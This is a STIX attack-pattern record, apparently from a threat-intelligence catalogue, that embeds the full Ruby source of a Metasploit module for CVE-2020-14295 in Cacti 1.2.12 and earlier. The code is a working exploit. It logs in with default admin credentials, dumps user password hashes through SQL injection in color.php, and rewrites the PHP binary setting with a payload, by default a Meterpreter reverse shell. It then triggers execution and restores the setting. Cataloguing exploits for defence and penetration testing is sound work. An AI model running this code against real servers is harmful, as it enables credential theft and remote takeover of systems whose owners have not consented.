{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--472f5c39-ba95-4acd-9535-854ee0c6490f",
    "created": "2024-08-14T17:14:36.810486Z",
    "modified": "2024-08-14T17:14:36.81049Z",
    "name": "Cacti color filter authenticated SQLi to RCE",
    "description": " This module exploits a SQL injection vulnerability in Cacti 1.2.12 and before. An admin can exploit the filter variable within color.php to pull arbitrary values as well as conduct stacked queries. With stacked queries, the path_php_binary value is changed within the settings table to a payload, and an update is called to execute the payload. After calling the payload, the value is reset.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/cacti_filter_sqli_rce.rb",
            "external_id": "cacti_filter_sqli_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Cacti/cacti/issues/3622"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-14295"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cacti color filter authenticated SQLi to RCE',\n        'Description' => %q{\n          This module exploits a SQL injection vulnerability in Cacti 1.2.12 and before. An admin can exploit the filter\n          variable within color.php to pull arbitrary values as well as conduct stacked queries. With stacked queries, the\n          path_php_binary value is changed within the settings table to a payload, and an update is called to execute the payload.\n          After calling the payload, the value is reset.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Leonardo Paiva', # edb, RCE\n          'Mayfly277' # original github, M4yFly on twitter SQLi\n        ],\n        'References' => [\n          [ 'EDB', '49810' ],\n          [ 'URL', 'https://github.com/Cacti/cacti/issues/3622' ],\n          [ 'CVE', '2020-14295' ]\n        ],\n        'Privileged' => false,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'DefaultOptions' => { 'Payload' => 'php/meterpreter/reverse_tcp' },\n        'Payload' => {\n          'BadChars' => \"\\x22\\x27\" # \" '\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ CONFIG_CHANGES, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2020-06-17',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', 'admin']),\n        OptString.new('TARGETURI', [ true, 'The URI of Cacti', '/cacti/']),\n        OptBool.new('CREDS', [ false, 'Dump cacti creds', true])\n      ]\n    )\n  end\n\n  def check\n    begin\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' => 'GET'\n      )\n      return CheckCode::Safe(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n      return CheckCode::Safe(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n      # cacti gives us the version in a JS variable\n      /var cactiVersion='(?<version>\\d{1,2}\\.\\d{1,2}\\.\\d{1,2})'/ =~ res.body\n\n      if version && Rex::Version.new(version) <= Rex::Version.new('1.2.12')\n        vprint_good(\"Version Detected: #{version}\")\n        return CheckCode::Appears\n      end\n    rescue ::Rex::ConnectionError\n      CheckCode::Safe(\"#{peer} - Could not connect to the web service\") # unknown maybe?\n    end\n    CheckCode::Safe(\"Cacti #{version} is not a vulnerable version.\")\n  end\n\n  def exploit\n    login\n\n    # optionally grab the un/pass fields for all users.  While we're already admin, cred stuffing...\n    if datastore['CREDS']\n      # https://user-images.githubusercontent.com/23179648/84865521-a213eb80-b078-11ea-985f-f994d3409c72.png\n      print_status('Dumping creds')\n      res = inject(\"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;\")\n      return unless res\n      return if res.nil?\n      return if res.body.nil?\n\n      res.body.split.each do |cred|\n        /\"(?<username>[^\"]+)\",\"(?<hash>[^\"]+)\"/ =~ cred\n        next unless hash\n        next if hash == 'hex' # header row\n\n        print_good(\"Username: #{username}, Password Hash: #{hash}\")\n        report_cred(\n          username: username,\n          password: hash,\n          private_type: :nonreplayable_hash\n        )\n      end\n    end\n\n    print_status('Backing-up path_php_binary value')\n    res = inject(\"')+UNION+SELECT+1,value,3,4,5,6,7+from+settings+where+name='path_php_binary';\")\n\n    # return value:\n    # \"name\",\"hex\"\n    # \"\",\"FEFCFF\"\n    # \"/usr/bin/php\",\"3\"\n    if res && !res.body.nil?\n      php_binary = res.body.split.last # check to make sure we have something first before proceeding\n      fail_with(Failure::NotFound, \"#{peer} - Unable to retrieve path_php_binary from server\") if php_binary.nil?\n      php_binary = php_binary.split(',')[0].gsub('\"', '') # take last entry on page, and split to value\n    end\n    fail_with(Failure::NotFound, \"#{peer} - Unable to retrieve path_php_binary from server\") unless php_binary\n    print_good(\"path_php_binary: #{php_binary}\")\n\n    print_status('Uploading payload')\n    begin\n      pload = \"#{php_binary} -r '#{payload.encoded}' #\"\n      pload = Rex::Text.uri_encode(pload.gsub(\"'\", \"\\\\\\\\'\"))\n      inject(\"')+UNION+SELECT+1,2,3,4,5,6,7;update+settings+set+value='#{pload}'+where+name='path_php_binary';\")\n      print_good('Executing Payload')\n      trigger\n    ensure\n      resetsqli(php_binary)\n    end\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\n\n  def login\n    cookie_jar.clear\n\n    print_status('Grabbing CSRF')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'keep_cookies' => true\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    /name='__csrf_magic' value=\"(?<csrf>[^\"]+)\"/ =~ res.body\n    fail_with(Failure::NotFound, 'Unable to find CSRF token') unless csrf\n\n    print_good(\"CSRF: #{csrf}\")\n\n    print_status('Attempting login')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'login_username' => datastore['USERNAME'],\n        'login_password' => datastore['PASSWORD'],\n        'action' => 'login',\n        '__csrf_magic' => csrf\n      }\n    )\n\n    if res && res.code != 302\n      fail_with(Failure::NoAccess, \"#{peer} - Invalid credentials (response code: #{res.code})\")\n    end\n\n    res\n  end\n\n  def inject(content)\n    res = send_request_cgi(\n      'uri' => \"#{normalize_uri(target_uri.path, 'color.php')}?action=export&header=false&filter=1#{content}--+-\",\n      'keep_cookies' => true\n    )\n\n    if res && res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Injection Failed (response code: #{res.code})\")\n    end\n    res\n  end\n\n  def trigger\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'host.php'),\n      'keep_cookies' => true,\n      'vars_get' => {\n        'action' => 'reindex'\n      }\n    )\n  end\n\n  def resetsqli(php_binary)\n    print_status('Cleaning up environment')\n    login # any subsequent requests with our cookie will fail, so we'll need to login a 2nd time to reset the database value correctly\n    print_status('Resetting DB Value')\n    inject(\"')+UNION+SELECT+1,2,3,4,5,6,7;update+settings+set+value='#{php_binary}'+where+name='path_php_binary';\")\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: datastore['RHOST'],\n      port: datastore['RPORT'],\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:username],\n      private_data: opts[:password],\n      private_type: opts[:private_type],\n      jtr_format: Metasploit::Framework::Hashes.identify_hash(opts[:password])\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: ''\n    }.merge(service_data)\n    create_credential_login(login_data)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-06-17",
    "x_mitre_platforms": [
        "['php']"
    ]
}